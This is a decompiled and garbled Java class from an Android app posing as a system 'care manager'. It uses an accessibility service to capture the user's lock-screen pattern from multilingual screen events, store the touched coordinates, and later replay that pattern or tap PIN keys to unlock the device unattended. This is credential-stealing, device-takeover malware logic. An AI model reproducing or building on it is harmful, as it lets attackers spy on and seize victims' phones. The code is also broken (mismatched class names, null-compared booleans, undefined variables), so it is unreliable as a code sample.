package com.system.caremanager;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.ArrayList;
import java.util.List;

public class LockMonitor {

    static boolean ifAuto;
    static boolean ifStartRecord;
    static LinkedList screenLockPointList;
    static Set screenLockPointSet;
    static LinkedList successcreenLockPointList;

    static {
        // Static initialization block
    }

    public ScreenLockMonitor() {
        return;
    }

    public static void checkEvent(AccessibilityEvent param1) {
        boolean ifStartRecord = ScreenLockMonitor.ifStartRecord;
        int val = 16384;
        if (ifStartRecord == null) {
            // branch: cond_1
        }
        int result = this.getEventType();
        if (result != val) {
            // branch: cond_1
        }
        List result2 = this.getText();
        if (result == null) {
            // branch: cond_1
        }
        List result3 = this.getText();
        boolean result4 = result.isEmpty();
        if (result != null) {
            // branch: cond_1
        }
        List result5 = this.getText();
        Object result6 = result.get(null);
        String str = "\u56fe\u6848\u7ed8\u5236\u5b8c\u6210";
        boolean result7 = str.equals(result);
        if (result != null) {
            // branch: cond_0
        }
        List result8 = this.getText();
        Object result9 = result.get(null);
        String str2 = "\u5716\u6848\u7e6a\u88fd\u5b8c\u6210";
        boolean result10 = str2.equals(result);
        if (result != null) {
            // branch: cond_0
        }
        List result11 = this.getText();
        Object result12 = result.get(null);
        String str3 = "\u5716\u5f62\u7e6a\u88fd\u5b8c\u6210";
        boolean result13 = str3.equals(result);
        if (result != null) {
            // branch: cond_0
        }
        List result14 = this.getText();
        Object result15 = result.get(null);
        String str4 = "\u5df2\u756b\u51fa\u89e3\u9396\u5716\u6848";
        boolean result16 = str4.equals(result);
        if (result != null) {
            // branch: cond_0
        }
        List result17 = this.getText();
        Object result18 = result.get(null);
        String str5 = "\u5df2\u756b\u51fa\u89e3\u9396\u5716\u5f62";
        boolean result19 = str5.equals(result);
        if (result != null) {
            // branch: cond_0
        }
        List result20 = this.getText();
        Object result21 = result.get(null);
        String str6 = "\u30d1\u30bf\u30fc\u30f3\u304c\u5b8c\u4e86\u3057\u307e\u3057\u305f";
        boolean result22 = str6.equals(result);
        if (result != null) {
            // branch: cond_0
        }
        List result23 = this.getText();
        Object result24 = result.get(null);
        String str7 = "\u30d1\u30bf\u30fc\u30f3\u306e\u63cf\u753b\u304c\u5b8c\u4e86\u3057\u307e\u3057\u305f";
        boolean result25 = str7.equals(result);
        if (result != null) {
            // branch: cond_0
        }
        List result26 = this.getText();
        Object result27 = result.get(null);
        String str8 = "Pattern completed";
        boolean result28 = str8.equals(result);
        if (result != null) {
            // branch: cond_0
        }
        List result29 = this.getText();
        Object result30 = result.get(null);
        String str9 = "\ud328\ud134 \uc644\ub8cc";
        boolean result31 = str9.equals(result);
        if (result != null) {
            // branch: cond_0
        }
        List result32 = this.getText();
        Object result33 = result.get(null);
        String str10 = "\ud328\ud134\uc774 \uc644\ub8cc\ub428";
        boolean result34 = str10.equals(result);
        if (result != null) {
            // branch: cond_0
        }
        List result35 = this.getText();
        Object result36 = result.get(null);
        String str11 = "\u0f62\u0f92\u0fb1\u0f53\u0f0b\u0f62\u0f72\u0f66\u0f0b\u0f56\u0fb2\u0f72\u0f66\u0f0b\u0f5a\u0f62\u0f0d";
        boolean result37 = str11.equals(result);
        if (result != null) {
            // branch: cond_0
        }
        List result38 = this.getText();
        Object result39 = result.get(null);
        String str12 = "\u0626\u06d5\u0646\u062f\u0649\u0632\u06d5 \u062a\u0627\u0645\u0627\u0645\u0644\u0627\u0646\u062f\u0649";
        boolean result40 = str12.equals(result);
        if (result == null) {
            // branch: cond_1
        }
        ScreenLockMonitor.ifStartRecord = null;
        boolean ifStartRecord2 = ScreenLockMonitor.ifStartRecord;
        if (ifStartRecord2 == null) {
            // branch: cond_4
        }
        boolean ifAuto = ScreenLockMonitor.ifAuto;
        if (ifAuto != null) {
            // branch: cond_4
        }
        AccessibilityNodeInfo result41 = this.getSource();
        if (result == null) {
            // branch: cond_4
        }
        int result42 = result.getChildCount();
        int val2 = 9;
        if (result != val2) {
            // branch: cond_4
        }
        int result43 = result.getChildCount();
        if (null >= result) {
            // branch: cond_4
        }
        AccessibilityNodeInfo result44 = result.getChild(null);
        List result45 = result.getActionList();
        Object result46 = result.get(null);
        result = (AccessibilityNodeInfo.AccessibilityAction) result;
        int result47 = result.getId();
        int val3 = 64;
        if (result != val3) {
            // branch: cond_3
        }
        AccessibilityNodeInfo result48 = result.getChild(null);
        CharSequence result49 = result.getText();
        String result50 = result.toString();
        Set screenLockPointSet = ScreenLockMonitor.screenLockPointSet;
        boolean result51 = screenLockPointSet.contains(result);
        if (result == null) {
            // branch: cond_2
        }
        // continue loop -> :goto_1
        Rect rect = new Rect();
        AccessibilityNodeInfo result52 = result.getChild(null);
        result.getBoundsInScreen(rect);
        ScreenLockMonitor.Node screenLockMonitor.Node = new ScreenLockMonitor.Node();
        int result53 = rect.centerX();
        int result54 = rect.centerY();
        String str13 = " ";
        String[] result55 = result.split(str13);
        Object item = result[1];
        LinkedList screenLockPointList = ScreenLockMonitor.screenLockPointList;
        boolean result56 = screenLockPointList.add(screenLockMonitor.Node);
        Set screenLockPointSet2 = ScreenLockMonitor.screenLockPointSet;
        boolean result57 = screenLockPointSet2.add(result);
        int val4 = null + 0x1;
        // continue loop -> :goto_0
        int result58 = this.getEventType();
        String str14 = "2";
        if (result != val) {
            // branch: cond_8
        }
        List result59 = this.getText();
        boolean result60 = result.isEmpty();
        if (result != null) {
            // branch: cond_8
        }
        List result61 = this.getText();
        Object result62 = result.get(null);
        String str15 = "\u5f00\u59cb\u7ed8\u5236\u56fe\u6848";
        boolean result63 = str15.equals(result);
        if (result != null) {
            // branch: cond_7
        }
        List result64 = this.getText();
        Object result65 = result.get(null);
        String str16 = "\u958b\u59cb\u7e6a\u88fd\u5716\u6848";
        boolean result66 = str16.equals(result);
        if (result != null) {
            // branch: cond_7
        }
        List result67 = this.getText();
        Object result68 = result.get(null);
        String str17 = "\u5df2\u958b\u59cb\u7e6a\u88fd\u89e3\u9396\u5716\u6848";
        boolean result69 = str17.equals(result);
        if (result != null) {
            // branch: cond_7
        }
        List result70 = this.getText();
        Object result71 = result.get(null);
        String str18 = "\u958b\u59cb\u7e6a\u88fd\u5716\u5f62";
        boolean result72 = str18.equals(result);
        if (result != null) {
            // branch: cond_7
        }
        List result73 = this.getText();
        Object result74 = result.get(null);
        String str19 = "\u958b\u59cb\u7e6a\u88fd\u89e3\u9396\u5716\u5f62";
        boolean result75 = str19.equals(result);
        if (result != null) {
            // branch: cond_7
        }
        List result76 = this.getText();
        Object result77 = result.get(null);
        String str20 = "\u5df2\u958b\u59cb\u7e6a\u88fd\u89e3\u9396\u5716\u5f62";
        boolean result78 = str20.equals(result);
        if (result != null) {
            // branch: cond_7
        }
        List result79 = this.getText();
        Object result80 = result.get(null);
        boolean result81 = str20.equals(result);
        if (result != null) {
            // branch: cond_7
        }
        List result82 = this.getText();
        Object result83 = result.get(null);
        String str21 = "\u30d1\u30bf\u30fc\u30f3\u304c\u958b\u59cb\u3055\u308c\u307e\u3057\u305f";
        boolean result84 = str21.equals(result);
        if (result != null) {
            // branch: cond_7
        }
        List result85 = this.getText();
        Object result86 = result.get(null);
        String str22 = "\u30d1\u30bf\u30fc\u30f3\u306e\u63cf\u753b\u3092\u958b\u59cb\u3057\u307e\u3057\u305f";
        boolean result87 = str22.equals(result);
        if (result != null) {
            // branch: cond_7
        }
        List result88 = this.getText();
        Object result89 = result.get(null);
        String str23 = "Pattern started";
        boolean result90 = str23.equals(result);
        if (result != null) {
            // branch: cond_7
        }
        List result91 = this.getText();
        Object result92 = result.get(null);
        String str24 = "\ud328\ud134 \uc2dc\uc791";
        boolean result93 = str24.equals(result);
        if (result != null) {
            // branch: cond_7
        }
        List result94 = this.getText();
        Object result95 = result.get(null);
        String str25 = "\ud328\ud134\uc774 \uc2dc\uc791\ub428";
        boolean result96 = str25.equals(result);
        if (result != null) {
            // branch: cond_7
        }
        List result97 = this.getText();
        Object result98 = result.get(null);
        boolean result99 = str26.equals(result);
        if (result != null) {
            // branch: cond_7
        }
        List result100 = this.getText();
        Object result101 = result.get(null);
        boolean result102 = str27.equals(result);
        if (result == null) {
            // branch: cond_5
        }
        // continue loop -> :goto_2
        List result103 = this.getText();
        Object result104 = result.get(null);
        String str28 = "\u56fe\u6848\u7ed8\u5236\u4e0d\u6b63\u786e";
        boolean result105 = str28.equals(result);
        if (result != null) {
            // branch: cond_6
        }
        List result106 = this.getText();
        Object result107 = result.get(null);
        String str29 = "\u56fe\u6848\u9519\u8bef";
        boolean result108 = str29.equals(result);
        if (result != null) {
            // branch: cond_6
        }
        List result109 = this.getText();
        Object result110 = result.get(null);
        String str30 = "\u5716\u6848\u932f\u8aa4";
        boolean result111 = str30.equals(result);
        if (result != null) {
            // branch: cond_6
        }
        List result112 = this.getText();
        Object result113 = result.get(null);
        String str31 = "\u5716\u6848\u7e6a\u88fd\u932f\u8aa4";
        boolean result114 = str31.equals(result);
        if (result != null) {
            // branch: cond_6
        }
        List result115 = this.getText();
        Object result116 = result.get(null);
        String str32 = "\u756b\u51fa\u7684\u5716\u6848\u932f\u8aa4";
        boolean result117 = str32.equals(result);
        if (result != null) {
            // branch: cond_6
        }
        List result118 = this.getText();
        Object result119 = result.get(null);
        String str33 = "\u30d1\u30bf\u30fc\u30f3\u304c\u9593\u9055\u3063\u3066\u3044\u307e\u3059";
        boolean result120 = str33.equals(result);
        if (result != null) {
            // branch: cond_6
        }
        List result121 = this.getText();
        Object result122 = result.get(null);
        String str34 = "\u30d1\u30bf\u30fc\u30f3\u304c\u6b63\u3057\u304f\u3042\u308a\u307e\u305b\u3093";
        boolean result123 = str34.equals(result);
        if (result != null) {
            // branch: cond_6
        }
        List result124 = this.getText();
        Object result125 = result.get(null);
        String str35 = "\u5165\u529b\u3057\u305f\u30d1\u30bf\u30fc\u30f3\u304c\u6b63\u3057\u304f\u3042\u308a\u307e\u305b\u3093";
        boolean result126 = str35.equals(result);
        if (result != null) {
            // branch: cond_6
        }
        List result127 = this.getText();
        Object result128 = result.get(null);
        String str36 = "Wrong pattern";
        boolean result129 = str36.equals(result);
        if (result != null) {
            // branch: cond_6
        }
        List result130 = this.getText();
        Object result131 = result.get(null);
        String str37 = "Incorrect pattern";
        boolean result132 = str37.equals(result);
        if (result != null) {
            // branch: cond_6
        }
        List result133 = this.getText();
        Object result134 = result.get(null);
        String str38 = "Incorrect pattern drawn";
        boolean result135 = str38.equals(result);
        if (result != null) {
            // branch: cond_6
        }
        List result136 = this.getText();
        Object result137 = result.get(null);
        String str39 = "\uc798\ubabb\ub41c \ud328\ud134";
        boolean result138 = str39.equals(result);
        if (result != null) {
            // branch: cond_6
        }
        List result139 = this.getText();
        Object result140 = result.get(null);
        String str40 = "\uc62c\ubc14\ub974\uc9c0 \uc54a\uc740 \ud328\ud134";
        boolean result141 = str40.equals(result);
        if (result != null) {
            // branch: cond_6
        }
        List result142 = this.getText();
        Object result143 = result.get(null);
        String str41 = "\ud328\ud134\uc744 \uc798\ubabb \uc785\ub825\ud588\uc2b5\ub2c8\ub2e4";
        boolean result144 = str41.equals(result);
        if (result == null) {
            // branch: cond_8
        }
        LinkedList screenLockPointList2 = ScreenLockMonitor.screenLockPointList;
        screenLockPointList2.clear();
        Set screenLockPointSet3 = ScreenLockMonitor.screenLockPointSet;
        screenLockPointSet3.clear();
        // continue loop -> :goto_3
        AccessibilityServiceCore.passcheck = str14;
        ScreenLockMonitor.ifStartRecord = 1;
        int result145 = this.getEventType();
        int val5 = 32;
        if (result != val5) {
            // branch: cond_a
        }
        String str42 = "com.android.systemui";
        CharSequence result146 = this.getPackageName();
        boolean result147 = str42.equals(result);
        if (result == null) {
            // branch: cond_a
        }
        int result148 = this.getContentChangeTypes();
        if (result != val5) {
            // branch: cond_a
        }
        List result149 = this.getText();
        if (result == null) {
            // branch: cond_a
        }
        List result150 = this.getText();
        boolean result151 = result.isEmpty();
        if (result != null) {
            // branch: cond_a
        }
        List result152 = this.getText();
        Object result153 = result.get(null);
        String str43 = "\u9501\u5b9a\u5c4f\u5e55\u3002";
        boolean result154 = str43.equals(result);
        if (result != null) {
            // branch: cond_9
        }
        List result155 = this.getText();
        Object result156 = result.get(null);
        String str44 = "\u87a2\u5e55\u9396\u5b9a\u3002";
        boolean result157 = str44.equals(result);
        if (result != null) {
            // branch: cond_9
        }
        List result158 = this.getText();
        Object result159 = result.get(null);
        String str45 = "\u4e0a\u9396\u756b\u9762\u3002";
        boolean result160 = str45.equals(result);
        if (result != null) {
            // branch: cond_9
        }
        List result161 = this.getText();
        Object result162 = result.get(null);
        String str46 = "\u30ed\u30c3\u30af\u753b\u9762";
        boolean result163 = str46.equals(result);
        if (result != null) {
            // branch: cond_9
        }
        List result164 = this.getText();
        Object result165 = result.get(null);
        String str47 = "\u30c7\u30d0\u30a4\u30b9\u306f\u30ed\u30c3\u30af\u3055\u308c\u3066\u3044\u307e\u3059";
        boolean result166 = str47.equals(result);
        if (result != null) {
            // branch: cond_9
        }
        List result167 = this.getText();
        Object result168 = result.get(null);
        String str48 = "Lock screen.";
        boolean result169 = str48.equals(result);
        if (result != null) {
            // branch: cond_9
        }
        List result170 = this.getText();
        Object result171 = result.get(null);
        String str49 = "\ud654\uba74\uc744 \uc7a0\uae09\ub2c8\ub2e4.";
        boolean result172 = str49.equals(result);
        if (result != null) {
            // branch: cond_9
        }
        List result173 = this.getText();
        Object result174 = result.get(null);
        boolean result175 = str50.equals(result);
        if (result != null) {
            // branch: cond_9
        }
        List result176 = this.getText();
        Object result177 = result.get(null);
        String str51 = "\u0626\u06d0\u0643\u0631\u0627\u0646 \u0642\u06c7\u0644\u06c7\u067e\u0644\u0627\u0634";
        boolean result178 = str51.equals(result);
        if (result == null) {
            // branch: cond_a
        }
        LinkedList screenLockPointList3 = ScreenLockMonitor.screenLockPointList;
        boolean result179 = screenLockPointList3.isEmpty();
        if (result != null) {
            // branch: cond_a
        }
        AccessibilityServiceCore.passcheck = str14;
        LinkedList successcreenLockPointList = ScreenLockMonitor.successcreenLockPointList;
        successcreenLockPointList.clear();
        LinkedList successcreenLockPointList2 = ScreenLockMonitor.successcreenLockPointList;
        LinkedList screenLockPointList4 = ScreenLockMonitor.screenLockPointList;
        boolean result180 = successcreenLockPointList2.addAll(screenLockPointList4);
        LinkedList screenLockPointList5 = ScreenLockMonitor.screenLockPointList;
        screenLockPointList5.clear();
        Set screenLockPointSet4 = ScreenLockMonitor.screenLockPointSet;
        screenLockPointSet4.clear();
        int result181 = this.getEventType();
        int val6 = 2048;
        if (result != val6) {
            // branch: cond_b
        }
        String str52 = "android";
        CharSequence result182 = this.getPackageName();
        boolean result183 = str52.equals(result);
        if (result == null) {
            // branch: cond_b
        }
        LinkedList screenLockPointList6 = ScreenLockMonitor.screenLockPointList;
        boolean result184 = this.isEmpty();
        if (result != null) {
            // branch: cond_b
        }
        AccessibilityServiceCore.passcheck = str14;
        LinkedList successcreenLockPointList3 = ScreenLockMonitor.successcreenLockPointList;
        this.clear();
        LinkedList successcreenLockPointList4 = ScreenLockMonitor.successcreenLockPointList;
        LinkedList screenLockPointList7 = ScreenLockMonitor.screenLockPointList;
        boolean result185 = this.addAll(screenLockPointList7);
        LinkedList screenLockPointList8 = ScreenLockMonitor.screenLockPointList;
        this.clear();
        Set screenLockPointSet5 = ScreenLockMonitor.screenLockPointSet;
        this.clear();
        return;
    }

    private static void clickEnter(AccessibilityServiceCore param1) {
        String str = "com.android.systemui:id/key_enter_text";
        AccessibilityNodeInfo result = Sea_rch.searchById(param1, str);
        if (result == null) {
            // branch: cond_0
        }
        // continue loop -> :goto_0
        String str2 = "com.android.systemui:id/key_enter";
        AccessibilityNodeInfo result2 = Sea_rch.searchById(param1, str2);
        Sea_rch.click(result);
        return;
    }

    private static void clickErrorUnlockButtonByGusture(AccessibilityServiceCore param1) {
        String str = "com.android.systemui:id/lockPatternView";
        AccessibilityNodeInfo result = Sea_rch.searchById(param1, str);
        if (result != null) {
            // branch: cond_0
        }
        String str2 = "com.android.systemui:id/vivo_lock_pattern_view";
        AccessibilityNodeInfo result2 = Sea_rch.searchById(param1, str2);
        if (result != null) {
            // branch: cond_1
        }
        return;
        Rect rect = new Rect();
        result.getBoundsInScreen(rect);
        StringBuilder stringBuilder = new StringBuilder();
        String str3 = "rect.centerX()";
        int result3 = rect.centerX();
        StringBuilder result4 = stringBuilder.append(result);
        String result5 = stringBuilder.toString();
        LogHelper.i(result);
        StringBuilder stringBuilder2 = new StringBuilder();
        String str4 = "rect.centerY()";
        int result6 = rect.centerY();
        StringBuilder result7 = stringBuilder2.append(result);
        String result8 = stringBuilder2.toString();
        LogHelper.i(result);
        int right = rect.right;
        int left = rect.left;
        int val = left - v2;
        int val2 = val / 0x6;
        int bottom = rect.bottom;
        int top = rect.top;
        int val3 = top - v3;
        int val4 = val3 / 0x6;
        LinkedList linkedList = new LinkedList();
        int val5 = 3;
        if (null >= val5) {
            // branch: cond_2
        }
        ScreenLockMonitor.Node screenLockMonitor.Node = new ScreenLockMonitor.Node();
        int left2 = rect.left;
        int val6 = val2 + v0;
        int top2 = rect.top;
        int val7 = val4 + v2;
        int val8 = val4 * null;
        int val9 = val8 * 0x2;
        int val10 = val9 + v9;
        StringBuilder stringBuilder3 = new StringBuilder();
        StringBuilder result9 = stringBuilder3.append(null);
        String str5 = "";
        StringBuilder result10 = stringBuilder3.append(str5);
        String result11 = stringBuilder3.toString();
        boolean result12 = linkedList.add(screenLockMonitor.Node);
        int val11 = null + 0x1;
        // continue loop -> :goto_0
        ScreenLockMonitor.Node screenLockMonitor.Node2 = new ScreenLockMonitor.Node();
        int left3 = rect.left;
        int val12 = screenLockMonitor.Node * v6;
        int val13 = val12 + v0;
        int top3 = rect.top;
        int val14 = val4 * 0x5;
        int val15 = val14 + v2;
        String str6 = "4";
        boolean result13 = linkedList.add(screenLockMonitor.Node2);
        Path path = new Path();
        Object result14 = linkedList.get(null);
        result = (ScreenLockMonitor.Node) result;
        float x = result.x;
        Object result15 = linkedList.get(null);
        result = (ScreenLockMonitor.Node) result;
        float y = result.y;
        path.moveTo(x, y);
        int result16 = linkedList.size();
        if (1 >= result) {
            // branch: cond_3
        }
        Object result17 = linkedList.get(1);
        result = (ScreenLockMonitor.Node) result;
        float x2 = result.x;
        Object result18 = linkedList.get(1);
        result = (ScreenLockMonitor.Node) result;
        float y2 = result.y;
        path.lineTo(x2, y2);
        int val16 = 1 + 0x1;
        // continue loop -> :goto_1
        int val17 = 13;
        ScreenLockMonitor.performGestureByCount(path, val17, param1);
        Set screenLockPointSet = ScreenLockMonitor.screenLockPointSet;
        this.clear();
        LinkedList screenLockPointList = ScreenLockMonitor.screenLockPointList;
        this.clear();
        LinkedList successcreenLockPointList = ScreenLockMonitor.successcreenLockPointList;
        this.clear();
        return;
    }

    private static void clickUnlockButton(AccessibilityServiceCore param1, String param2) {
        try {
            int val = 6;
            if (null >= val) {
                // branch: cond_4
            }
            int val2 = 7;
            if (1 >= val2) {
                // branch: cond_1
            }
            StringBuilder stringBuilder = new StringBuilder();
            StringBuilder result = stringBuilder.append(param2);
            StringBuilder result2 = stringBuilder.append(1);
            String result3 = stringBuilder.toString();
            AccessibilityNodeInfo result4 = Sea_rch.searchById(param1, result);
            if (result == null) {
                // branch: cond_0
            }
            String result5 = result.toString();
            LogHelper.i(result);
            Sea_rch.click(result);
            int val3 = 1 + 0x1;
            // continue loop -> :goto_1
            ScreenLockMonitor.clickEnter(param1);
            String result6 = Br_and.getBrand();
            String result7 = result.toLowerCase();
            String str = "huawei";
            boolean result8 = result.equals(str);
            if (result != null) {
                // branch: cond_3
            }
            String result9 = Br_and.getBrand();
            String result10 = result.toLowerCase();
            String str2 = "honor";
            boolean result11 = result.equals(str2);
            if (result == null) {
                // branch: cond_2
            }
            // continue loop -> :goto_2
            int val4 = 200;
            // continue loop -> :goto_3
            int val5 = 800;
            long longVal = (long) val5;
            Thread.sleep(longVal, str2);
            int val6 = null + 0x1;
            // continue loop -> :goto_0
            } catch (Exception e) {
                e.printStackTrace();
            RuntimeException runtimeException = new RuntimeException();
            throw new RuntimeException(runtimeException.toString());
            String str3 = "";
            MainBackgroundService.currentSuccessPassword = str3;
            AccessibilityServiceCore.ccurrentPassword = str3;
            return;
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static void destoryLock(AccessibilityServiceCore param1) {
        Thread thread = new Thread();
        ScreenLockMonitor.2 screenLockMonitor.2 = new ScreenLockMonitor.2();
        thread.start();
        return;
    }

    private static int getScreenType(AccessibilityServiceCore param1) {
        String str = "com.android.systemui:id/VivoPinkey0";
        AccessibilityNodeInfo result = Sea_rch.searchById(param1, str);
        String str2 = "com.android.systemui:id/key1";
        AccessibilityNodeInfo result2 = Sea_rch.searchById(param1, str2);
        if (result == null) {
            // branch: cond_0
        }
        int val = 3;
        return val;
        if (val == null) {
            // branch: cond_1
        }
        return 1;
        int val2 = 2;
        return val2;
    }

    private static void lightScreen(AccessibilityServiceCore param1) {
        try {
            this.wakeupScreen();
            int val = 3;
            boolean result = this.performGlobalAction(val);
            Thread.sleep(val, v1);
            return;
            } catch (Exception e) {
                e.printStackTrace();
            RuntimeException runtimeException = new RuntimeException();
            throw new RuntimeException(runtimeException.toString());
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private static void logevent(AccessibilityEvent param1) {
        return;
    }

    private static void performGestureByCount(Path param1, int param2, AccessibilityServiceCore param3) {
        int SDK_INT = Build$VERSION.SDK_INT;
        int val = 24;
        if (SDK_INT < val) {
            // branch: cond_0
        }
        GestureDescription.Builder result = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m();
        GestureDescription.StrokeDescription result2 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(param1, val, v2, v3, v4);
        GestureDescription.Builder result3 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(result, result);
        GestureDescription result4 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(result);
        ScreenLockMonitor.3 screenLockMonitor.3 = new ScreenLockMonitor.3();
        boolean result5 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(param3, result, screenLockMonitor.3, null);
        return;
    }

    public static void startUnLock(Context param1) {
        LinkedList successcreenLockPointList = ScreenLockMonitor.successcreenLockPointList;
        boolean result = successcreenLockPointList.isEmpty();
        if (result == null) {
            // branch: cond_0
        }
        return;
        ScreenLockMonitor.ifAuto = 1;
        Path path = new Path();
        LinkedList successcreenLockPointList2 = ScreenLockMonitor.successcreenLockPointList;
        Object result2 = successcreenLockPointList2.get(null);
        result = (ScreenLockMonitor.Node) result;
        float x = result.x;
        LinkedList successcreenLockPointList3 = ScreenLockMonitor.successcreenLockPointList;
        Object result3 = successcreenLockPointList3.get(null);
        result = (ScreenLockMonitor.Node) result;
        float y = result.y;
        path.moveTo(x, y);
        LinkedList successcreenLockPointList4 = ScreenLockMonitor.successcreenLockPointList;
        int result4 = successcreenLockPointList4.size();
        if (1 >= result) {
            // branch: cond_1
        }
        LinkedList successcreenLockPointList5 = ScreenLockMonitor.successcreenLockPointList;
        Object result5 = successcreenLockPointList5.get(1);
        result = (ScreenLockMonitor.Node) result;
        float x2 = result.x;
        LinkedList successcreenLockPointList6 = ScreenLockMonitor.successcreenLockPointList;
        Object result6 = successcreenLockPointList6.get(1);
        result = (ScreenLockMonitor.Node) result;
        float y2 = result.y;
        path.lineTo(x2, y2);
        int val = 1 + 0x1;
        // continue loop -> :goto_0
        int SDK_INT = Build$VERSION.SDK_INT;
        int val2 = 24;
        if (SDK_INT < val2) {
            // branch: cond_2
        }
        GestureDescription.Builder result7 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m();
        GestureDescription.StrokeDescription result8 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(path, val2, y2, successcreenLockPointList3, v5);
        GestureDescription.Builder result9 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(result, result);
        GestureDescription result10 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(result);
        param1 = (AccessibilityService) param1;
        ScreenLockMonitor.1 screenLockMonitor.1 = new ScreenLockMonitor.1();
        boolean result11 = DataPackagingEngine..ExternalSyntheticApiModelOutline0.m(param1, result, screenLockMonitor.1, null);
        return;
    }

}